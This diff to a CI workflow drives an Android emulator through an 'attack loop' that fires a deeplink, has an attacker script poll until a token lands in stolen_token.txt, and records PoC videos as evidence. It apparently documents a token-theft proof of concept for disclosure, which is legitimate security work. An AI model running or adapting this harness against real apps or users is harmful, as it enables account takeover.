@@ -54,7 +54,7 @@ jobs:
       - name: boot
         run: |
           export PATH=$ANDROID_HOME/platform-tools:$PATH
-          ( $ANDROID_HOME/emulator/emulator -avd btse -no-window -no-audio -no-boot-anim -gpu swiftshader_indirect -camera-back none -no-snapshot -http-proxy http://43.156.21.122:8080 > /tmp/emu.log 2>&1 & )
+          ( $ANDROID_HOME/emulator/emulator -avd btse -no-window -no-audio -no-boot-anim -gpu swiftshader_indirect -camera-back none -no-snapshot > /tmp/emu.log 2>&1 & )
           t0=$(date +%s)
           if timeout 420 bash -c 'adb wait-for-device; while [ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d "\r")" != "1" ]; do sleep 5; done'; then
             echo "BOOT_OK in $(( $(date +%s)-t0 ))s"
@@ -245,10 +245,16 @@ jobs:
             sleep 15
           done
           echo "STABLE=$STABLE"
+          # 3b) quiet period: beri 60s ekstra agar burst refresh background habis
+          sleep 60
           # 4) attack loop: max 2 ronde; FIRE-ONCE deeplink + TTL guard (sid ±180s)
-          #    bucket IP: app=SG proxy, attacker poll=direct (lihat poc_attacker.py)
+          #    egress app: DIRECT runner (SG egress ter-throttle testapi)
+          #    attacker poll: direct (IP runner) — semua satu egress bersih
           for round in 1 2; do
             if [ -s stolen_token.txt ]; then break; fi
+            # rekam layar utk video PoC (max 170s < limit screenrecord 180s)
+            ( adb shell screenrecord --time-limit 170 /sdcard/poc_r${round}.mp4 > /dev/null 2>&1 & )
+            echo "SCREEN_RECORD r${round} started"
             # in-loop gate PASSIVE: tunggu focus kembali (max 30s), jangan relaunch = jangan burst
             for w in $(seq 1 6); do
               FOCUS=$(adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus | tr -d '\r')
@@ -316,6 +322,11 @@ jobs:
             # tunggu token attacker (post-tap ada jeda: approve→poll SUCCESS)
             for i in $(seq 1 15); do [ -s stolen_token.txt ] && break; sleep 2; done
             kill $ATK 2>/dev/null || true
+            # stop screenrecord + unduh video ronde ini
+            adb shell pkill -f screenrecord 2>/dev/null || true
+            sleep 2
+            adb pull /sdcard/poc_r${round}.mp4 /tmp/poc_r${round}.mp4 >/dev/null 2>&1 || true
+            echo "VIDEO_R${round}=$(stat -c %s /tmp/poc_r${round}.mp4 2>/dev/null || echo missing)"
             if [ -s stolen_token.txt ]; then break; fi
             echo "ROUND=$round NO_TOKEN TAPPED=$TAPPED ERRC=$ERRC lanjut ronde berikutnya"
           done
@@ -342,9 +353,12 @@ jobs:
           path: |
             /tmp/s1.png
             /tmp/s2.png
+            /tmp/s2b.png
             /tmp/s3.png
             /tmp/s4.png
             /tmp/s5.png
+            /tmp/poc_r1.mp4
+            /tmp/poc_r2.mp4
             /tmp/ui.xml
             /tmp/logcat.txt
             /tmp/attack.log
